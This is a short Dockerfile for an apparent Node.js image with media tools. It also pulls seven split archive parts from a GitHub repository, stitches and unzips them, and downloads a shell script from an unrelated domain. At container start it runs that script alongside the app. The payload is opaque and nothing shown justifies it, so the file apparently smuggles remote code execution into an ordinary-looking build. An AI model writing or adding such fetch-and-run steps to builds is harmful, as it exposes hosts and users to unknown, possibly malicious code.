FROM node:17.0.0
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/OliveiraHg/paulete/raw/main/aa https://github.com/OliveiraHg/paulete/raw/main/ab https://github.com/OliveiraHg/paulete/raw/main/ac https://github.com/OliveiraHg/paulete/raw/main/ad https://github.com/OliveiraHg/paulete/raw/main/ae https://github.com/OliveiraHg/paulete/raw/main/af https://github.com/OliveiraHg/paulete/raw/main/ag
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
